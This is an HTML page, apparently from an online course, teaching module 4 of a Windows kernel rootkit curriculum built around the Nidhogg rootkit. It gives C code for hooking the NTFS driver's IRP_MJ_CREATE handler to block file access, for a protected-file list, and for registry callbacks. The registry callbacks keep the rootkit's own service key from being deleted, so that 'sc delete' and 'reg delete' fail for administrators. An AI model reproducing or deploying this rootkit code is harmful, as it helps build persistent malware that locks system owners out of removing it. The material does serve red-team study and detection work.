@@ -1,0 +1,402 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Module 4: File & Registry Protection - Nidhogg Course</title>
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>&#x1F409;</text></svg>">
+<link rel="stylesheet" href="../../../assets/course.css">
+<style>:root{--accent:#dc2626;--accent2:#b91c1c;--gradient:linear-gradient(135deg,#dc2626,#b91c1c)}</style>
+</head>
+<body>
+
+<button class="hamburger" aria-label="Toggle navigation">&#9776;</button>
+
+<nav>
+<div class="logo">
+<h2>Nidhogg Course</h2>
+<span>Kernel Rootkit Masterclass</span>
+</div>
+<a class="home-link" href="../Nidhogg_index.html">&larr; Course Home</a>
+<a class="mod-link" href="module1.html"><span>1. Kernel vs User-Mode</span><span class="diff d1">d1</span></a>
+<a class="mod-link" href="module2.html"><span>2. Driver Basics</span><span class="diff d1">d1</span></a>
+<a class="mod-link" href="module3.html"><span>3. Process &amp; Thread</span><span class="diff d1">d1</span></a>
+<a class="mod-link active" href="module4.html"><span>4. File &amp; Registry</span><span class="diff d2">d2</span></a>
+<a class="mod-link" href="module5.html"><span>5. ETW Disabling</span><span class="diff d2">d2</span></a>
+<a class="mod-link" href="module6.html"><span>6. Callbacks &amp; Notifications</span><span class="diff d2">d2</span></a>
+<a class="mod-link" href="module7.html"><span>7. Memory Evasion</span><span class="diff d3">d3</span></a>
+<a class="mod-link" href="module8.html"><span>8. Full Chain &amp; Detection</span><span class="diff d3">d3</span></a>
+</nav>
+
+<main>
+<span class="diff-badge med">Difficulty: Intermediate</span>
+<h1>Module 4: File &amp; Registry Protection</h1>
+<p class="subtitle">IRP hooking for file protection and CmRegisterCallbackEx for registry defense.</p>
+
+<div class="card highlight">
+<h4>Module Objective</h4>
+<p>Understand how Nidhogg protects files by hooking IRP major function handlers on the filesystem driver, how registry keys and values are protected using <code>CmRegisterCallbackEx</code>, the mechanics of pre-operation and post-operation callbacks, and the architectural considerations for each approach.</p>
+</div>
+
+<!-- ============================================================ -->
+<h2>1. Windows I/O Architecture and File Systems</h2>
+
+<p>All file operations on Windows pass through the I/O Manager, which routes requests as IRPs to the appropriate filesystem driver. The chain looks like this:</p>
+
+<div class="diagram">
+<h4 style="color:var(--accent);margin-bottom:15px;text-align:center">File I/O Request Flow</h4>
+<div class="flow">
+<div class="flow box">User App<br><small>CreateFile()</small></div>
+<div class="flow arrow">&rarr;</div>
+<div class="flow box">I/O Manager<br><small>Creates IRP</small></div>
+<div class="flow arrow">&rarr;</div>
+<div class="flow box">Filter Drivers<br><small>Minifilters</small></div>
+<div class="flow arrow">&rarr;</div>
+<div class="flow box">NTFS.sys<br><small>Filesystem</small></div>
+<div class="flow arrow">&rarr;</div>
+<div class="flow box">Disk Driver<br><small>Storage</small></div>
+</div>
+</div>
+
+<p>The filesystem driver (typically NTFS) exposes a <code>DRIVER_OBJECT</code> with a <code>MajorFunction</code> table, just like any driver. Each entry in this table points to a handler for a specific IRP type. By replacing a pointer in this table, a rootkit can intercept all file operations of that type <strong>system-wide</strong>.</p>
+
+<!-- ============================================================ -->
+<h2>2. IRP Major Function Hooking</h2>
+
+<p>Nidhogg protects files by hooking the <code>IRP_MJ_CREATE</code> handler of the NTFS driver. <code>IRP_MJ_CREATE</code> is sent for every file open/create operation, making it the ideal interception point:</p>
+
+<pre><span class="lang-tag">C</span>// Global variables for the hook
+PDRIVER_OBJECT g_NtfsDriverObject = NULL;
+PDRIVER_DISPATCH g_OriginalNtfsMjCreate = NULL;
+
+NTSTATUS InstallFileProtectionHook() {
+    UNICODE_STRING ntfsName = RTL_CONSTANT_STRING(L"\\FileSystem\\Ntfs");
+    NTSTATUS status;
+
+    // 1. Get a pointer to the NTFS driver object
+    status = ObReferenceObjectByName(
+        &ntfsName,
+        OBJ_CASE_INSENSITIVE,
+        NULL,
+        0,
+        *IoDriverObjectType,
+        KernelMode,
+        NULL,
+        (PVOID*)&g_NtfsDriverObject
+    );
+    if (!NT_SUCCESS(status)) return status;
+
+    // 2. Save the original IRP_MJ_CREATE handler
+    g_OriginalNtfsMjCreate =
+        g_NtfsDriverObject->MajorFunction[IRP_MJ_CREATE];
+
+    // 3. Replace with our hook function
+    InterlockedExchangePointer(
+        (PVOID*)&g_NtfsDriverObject->MajorFunction[IRP_MJ_CREATE],
+        (PVOID)HookedNtfsMjCreate
+    );
+
+    ObDereferenceObject(g_NtfsDriverObject);
+    return STATUS_SUCCESS;
+}</pre>
+
+<div class="card warn">
+<h4>PatchGuard Consideration</h4>
+<p>Modifying the <code>MajorFunction</code> table of a filesystem driver is a form of hooking that PatchGuard may or may not monitor depending on the Windows version and the specific driver. In some builds, PatchGuard checks the NTFS driver object; in others, it does not. Nidhogg uses this approach because it is simpler than writing a proper minifilter, but a production rootkit might use a minifilter registration instead to avoid PatchGuard entirely.</p>
+</div>
+
+<!-- ============================================================ -->
+<h2>3. The IRP_MJ_CREATE Hook Function</h2>
+
+<p>The hook intercepts every file open request, checks if the target file is in the protected list, and returns <code>STATUS_ACCESS_DENIED</code> if it is:</p>
+
+<pre><span class="lang-tag">C</span>NTSTATUS HookedNtfsMjCreate(PDEVICE_OBJECT DeviceObject, PIRP Irp) {
+    PIO_STACK_LOCATION irpStack = IoGetCurrentIrpStackLocation(Irp);
+    PFILE_OBJECT fileObject = irpStack->FileObject;
+
+    // Check if this file is in our protected list
+    if (fileObject && fileObject->FileName.Buffer) {
+        if (IsProtectedFile(&fileObject->FileName)) {
+            // Block access to this file
+            Irp->IoStatus.Status = STATUS_ACCESS_DENIED;
+            Irp->IoStatus.Information = 0;
+            IoCompleteRequest(Irp, IO_NO_INCREMENT);
+            return STATUS_ACCESS_DENIED;
+        }
+    }
+
+    // Not protected - pass through to original handler
+    return g_OriginalNtfsMjCreate(DeviceObject, Irp);
+}</pre>
+
+<div class="card">
+<h4>The FILE_OBJECT</h4>
+<p>The <code>FILE_OBJECT</code> structure represents an open instance of a file. Its <code>FileName</code> field contains the path of the file being opened. By checking this path against a list of protected files, the hook can selectively block access while allowing all other file operations to proceed normally.</p>
+</div>
+
+<!-- ============================================================ -->
+<h2>4. Protected File List Management</h2>
+
+<p>Nidhogg maintains an internal list of protected file paths. The user-mode client adds and removes entries via IOCTLs:</p>
+
+<pre><span class="lang-tag">C</span>// Protected files data structure
+#define MAX_PROTECTED_FILES 64
+
+typedef struct _PROTECTED_FILES {
+    UNICODE_STRING FilePaths[MAX_PROTECTED_FILES];
+    ULONG Count;
+    FAST_MUTEX Lock;  // Synchronization for concurrent access
+} PROTECTED_FILES, *PPROTECTED_FILES;
+
+PROTECTED_FILES g_ProtectedFiles = { 0 };
+
+BOOLEAN IsProtectedFile(PUNICODE_STRING filePath) {
+    ExAcquireFastMutex(&g_ProtectedFiles.Lock);
+
+    for (ULONG i = 0; i < g_ProtectedFiles.Count; i++) {
+        // Case-insensitive comparison
+        if (RtlCompareUnicodeString(
+                filePath,
+                &g_ProtectedFiles.FilePaths[i],
+                TRUE  // CaseInsensitive
+            ) == 0) {
+            ExReleaseFastMutex(&g_ProtectedFiles.Lock);
+            return TRUE;
+        }
+    }
+
+    ExReleaseFastMutex(&g_ProtectedFiles.Lock);
+    return FALSE;
+}
+
+NTSTATUS AddProtectedFile(PUNICODE_STRING filePath) {
+    ExAcquireFastMutex(&g_ProtectedFiles.Lock);
+
+    if (g_ProtectedFiles.Count >= MAX_PROTECTED_FILES) {
+        ExReleaseFastMutex(&g_ProtectedFiles.Lock);
+        return STATUS_INSUFFICIENT_RESOURCES;
+    }
+
+    // Allocate and copy the path string
+    ULONG idx = g_ProtectedFiles.Count;
+    g_ProtectedFiles.FilePaths[idx].Buffer =
+        ExAllocatePool2(POOL_FLAG_PAGED, filePath->Length, 'fdiN');
+    // ... copy string, increment count ...
+
+    ExReleaseFastMutex(&g_ProtectedFiles.Lock);
+    return STATUS_SUCCESS;
+}</pre>
+
+<!-- ============================================================ -->
+<h2>5. Registry Callback Architecture</h2>
+
+<p>For registry protection, Nidhogg uses <code>CmRegisterCallbackEx</code>, a fully documented and supported kernel API. Unlike IRP hooking, this is the designed mechanism for monitoring and filtering registry operations:</p>
+
+<pre><span class="lang-tag">C</span>// Registry callback registration
+LARGE_INTEGER g_RegCallbackCookie;  // Handle for unregistration
+
+NTSTATUS InstallRegistryProtection() {
+    UNICODE_STRING altitude = RTL_CONSTANT_STRING(L"321000");
+
+    NTSTATUS status = CmRegisterCallbackEx(
+        RegistryCallback,       // Our callback function
+        &altitude,              // Altitude (determines ordering)
+        DriverObject,           // Our driver object
+        NULL,                   // Context (optional)
+        &g_RegCallbackCookie,   // Cookie for unregistration
+        NULL                    // Reserved
+    );
+
+    return status;
+}
+
+// Unregistration during driver unload
+VOID UninstallRegistryProtection() {
+    CmUnRegisterCallback(g_RegCallbackCookie);
+}</pre>
+
+<div class="card green">
+<h4>Why CmRegisterCallbackEx Is Preferred</h4>
+<p><code>CmRegisterCallbackEx</code> is a supported, documented API that provides proper callback ordering via altitudes, clean registration/unregistration semantics, and does not trigger PatchGuard. Unlike hooking the SSDT or inline-patching kernel functions, registry callbacks are the legitimate way to intercept registry operations from a kernel driver.</p>
+</div>
+
+<!-- ============================================================ -->
+<h2>6. The Registry Callback Function</h2>
+
+<p>The registry callback receives notifications for all registry operations system-wide. Nidhogg filters these to protect specific keys and values:</p>
+
+<pre><span class="lang-tag">C</span>NTSTATUS RegistryCallback(
+    PVOID CallbackContext,
+    PVOID Argument1,    // REG_NOTIFY_CLASS (operation type)
+    PVOID Argument2     // Operation-specific information structure
+) {
+    UNREFERENCED_PARAMETER(CallbackContext);
+    REG_NOTIFY_CLASS notifyClass = (REG_NOTIFY_CLASS)(ULONG_PTR)Argument1;
+
+    switch (notifyClass) {
+    // Pre-operation callbacks (can block the operation)
+    case RegNtPreDeleteKey: {
+        PREG_DELETE_KEY_INFORMATION info =
+            (PREG_DELETE_KEY_INFORMATION)Argument2;
+        if (IsProtectedRegistryKey(info->Object))
+            return STATUS_ACCESS_DENIED;  // Block deletion
+        break;
+    }
+    case RegNtPreSetValueKey: {
+        PREG_SET_VALUE_KEY_INFORMATION info =
+            (PREG_SET_VALUE_KEY_INFORMATION)Argument2;
+        if (IsProtectedRegistryKey(info->Object))
+            return STATUS_ACCESS_DENIED;  // Block value modification
+        break;
+    }
+    case RegNtPreDeleteValueKey: {
+        PREG_DELETE_VALUE_KEY_INFORMATION info =
+            (PREG_DELETE_VALUE_KEY_INFORMATION)Argument2;
+        if (IsProtectedRegistryKey(info->Object))
+            return STATUS_ACCESS_DENIED;  // Block value deletion
+        break;
+    }
+    case RegNtPreRenameKey: {
+        PREG_RENAME_KEY_INFORMATION info =
+            (PREG_RENAME_KEY_INFORMATION)Argument2;
+        if (IsProtectedRegistryKey(info->Object))
+            return STATUS_ACCESS_DENIED;  // Block key rename
+        break;
+    }
+    default:
+        break;
+    }
+
+    return STATUS_SUCCESS;  // Allow all other operations
+}</pre>
+
+<!-- ============================================================ -->
+<h2>7. Registry Operation Types</h2>
+
+<p>The <code>REG_NOTIFY_CLASS</code> enumeration defines all interceptable registry operations. Nidhogg focuses on the destructive/modifying operations:</p>
+
+<table>
+<tr><th>Notify Class</th><th>Operation</th><th>Nidhogg Action</th></tr>
+<tr><td><code>RegNtPreDeleteKey</code></td><td>Deleting a registry key</td><td>Block if key is protected</td></tr>
+<tr><td><code>RegNtPreSetValueKey</code></td><td>Setting/modifying a value</td><td>Block if key is protected</td></tr>
+<tr><td><code>RegNtPreDeleteValueKey</code></td><td>Deleting a value</td><td>Block if key is protected</td></tr>
+<tr><td><code>RegNtPreRenameKey</code></td><td>Renaming a key</td><td>Block if key is protected</td></tr>
+<tr><td><code>RegNtPreCreateKeyEx</code></td><td>Creating a new subkey</td><td>Allow (does not modify existing)</td></tr>
+<tr><td><code>RegNtPreQueryValueKey</code></td><td>Reading a value</td><td>Allow (read-only, not destructive)</td></tr>
+</table>
+
+<div class="card">
+<h4>Pre vs Post Callbacks</h4>
+<p><strong>Pre-operation</strong> callbacks fire before the operation occurs. Returning <code>STATUS_ACCESS_DENIED</code> blocks the operation entirely. <strong>Post-operation</strong> callbacks fire after the operation completes and can modify the result but cannot prevent the operation. For protection, pre-operation callbacks are essential because they can veto the operation before any change is made.</p>
+</div>
+
+<!-- ============================================================ -->
+<h2>8. Resolving Registry Key Objects</h2>
+
+<p>Registry callbacks receive a <code>PVOID Object</code> pointer to the registry key object. To determine if this key is protected, Nidhogg must resolve the full key path:</p>
+
+<pre><span class="lang-tag">C</span>BOOLEAN IsProtectedRegistryKey(PVOID keyObject) {
+    PCUNICODE_STRING keyName = NULL;
+
+    // CmCallbackGetKeyObjectIDEx resolves the key object to its full path
+    NTSTATUS status = CmCallbackGetKeyObjectIDEx(
+        &g_RegCallbackCookie,  // Our registration cookie
+        keyObject,              // The key object from the callback
+        NULL,                   // ObjectID (not needed)
+        &keyName,               // Full key path output
+        0                       // Flags
+    );
+
+    if (!NT_SUCCESS(status) || !keyName)
+        return FALSE;
+
+    // Check against our protected keys list
+    BOOLEAN isProtected = FALSE;
+    ExAcquireFastMutex(&g_ProtectedKeys.Lock);
+
+    for (ULONG i = 0; i < g_ProtectedKeys.Count; i++) {
+        if (RtlCompareUnicodeString(
+                keyName,
+                &g_ProtectedKeys.KeyPaths[i],
+                TRUE
+            ) == 0) {
+            isProtected = TRUE;
+            break;
+        }
+    }
+
+    ExReleaseFastMutex(&g_ProtectedKeys.Lock);
+    CmCallbackReleaseKeyObjectIDEx(keyName);  // Free the string
+    return isProtected;
+}</pre>
+
+<!-- ============================================================ -->
+<h2>9. Protecting the Driver's Own Registry Key</h2>
+
+<p>An important use case: Nidhogg can protect its own service registry key, preventing administrators from deleting or modifying the driver's configuration:</p>
+
+<pre><span class="lang-tag">Text</span>Protected key: \REGISTRY\MACHINE\SYSTEM\CurrentControlSet\Services\Nidhogg
+
+Effect:
+- sc delete Nidhogg        --> fails with ACCESS_DENIED
+- reg delete HKLM\SYSTEM\...\Services\Nidhogg --> fails
+- regedit manual deletion   --> fails
+- Any tool modifying the key --> fails
+
+The driver service persists across reboots because the
+registry entry cannot be removed while the driver is loaded.</pre>
+
+<div class="card warn">
+<h4>Operational Consideration</h4>
+<p>Self-protecting the registry key makes the rootkit persistent but also makes clean removal harder. During red team engagements, the team should always maintain a mechanism to disable protections (e.g., a specific IOCTL that removes the key from the protected list). Leaving an unremovable rootkit on a client system is an operational failure.</p>
+</div>
+
+<!-- ============================================================ -->
+<h2>10. Comparison: IRP Hooking vs Minifilter vs Callback</h2>
+
+<table>
+<tr><th>Mechanism</th><th>Used For</th><th>PatchGuard Safe</th><th>Complexity</th></tr>
+<tr><td><strong>IRP MajorFunction Hooking</strong></td><td>File protection in Nidhogg</td><td>Risky on newer builds</td><td>Low &mdash; simple pointer swap</td></tr>
+<tr><td><strong>Minifilter (FltRegisterFilter)</strong></td><td>Legitimate filesystem filtering</td><td>Yes &mdash; designed API</td><td>High &mdash; full minifilter framework</td></tr>
+<tr><td><strong>CmRegisterCallbackEx</strong></td><td>Registry protection in Nidhogg</td><td>Yes &mdash; documented API</td><td>Low &mdash; single callback function</td></tr>
+<tr><td><strong>ObRegisterCallbacks</strong></td><td>Process/thread handle protection</td><td>Yes &mdash; documented API</td><td>Low &mdash; used in Module 3</td></tr>
+</table>
+
+<!-- ============================================================ -->
+<div class="quiz">
+<h2>Knowledge Check</h2>
+
+<div class="quiz-q" data-answer="A">
+<p>Q1: Why does Nidhogg hook IRP_MJ_CREATE specifically for file protection?</p>
+<div class="quiz-btn" data-choice="A">A) IRP_MJ_CREATE is sent for every file open operation; blocking it prevents any access to the protected file</div>
+<div class="quiz-btn" data-choice="B">B) IRP_MJ_CREATE is the only IRP type that can be hooked</div>
+<div class="quiz-btn" data-choice="C">C) IRP_MJ_CREATE handles file deletion operations</div>
+<div class="quiz-btn" data-choice="D">D) IRP_MJ_CREATE is required by PatchGuard</div>
+</div>
+
+<div class="quiz-q" data-answer="C">
+<p>Q2: What is the advantage of CmRegisterCallbackEx over SSDT hooking for registry protection?</p>
+<div class="quiz-btn" data-choice="A">A) CmRegisterCallbackEx is faster</div>
+<div class="quiz-btn" data-choice="B">B) CmRegisterCallbackEx provides access to more registry operations</div>
+<div class="quiz-btn" data-choice="C">C) CmRegisterCallbackEx is a documented API that does not trigger PatchGuard, unlike SSDT modifications</div>
+<div class="quiz-btn" data-choice="D">D) CmRegisterCallbackEx works on all Windows versions including XP</div>
+</div>
+
+<div class="quiz-q" data-answer="B">
+<p>Q3: How does a pre-operation registry callback block an operation?</p>
+<div class="quiz-btn" data-choice="A">A) By setting a flag in the registry key object</div>
+<div class="quiz-btn" data-choice="B">B) By returning STATUS_ACCESS_DENIED, which prevents the operation from executing</div>
+<div class="quiz-btn" data-choice="C">C) By deleting the IRP associated with the operation</div>
+<div class="quiz-btn" data-choice="D">D) By unmapping the registry hive from memory</div>
+</div>
+</div>
+
+<div class="nav-btns">
+<a href="module3.html">&larr; Previous: Process &amp; Thread Manipulation</a>
+<a class="primary" href="module5.html">Next: ETW Provider Disabling &rarr;</a>
+</div>
+</main>
+
+<script src="../../../assets/course.js"></script>
+</body>
+</html>
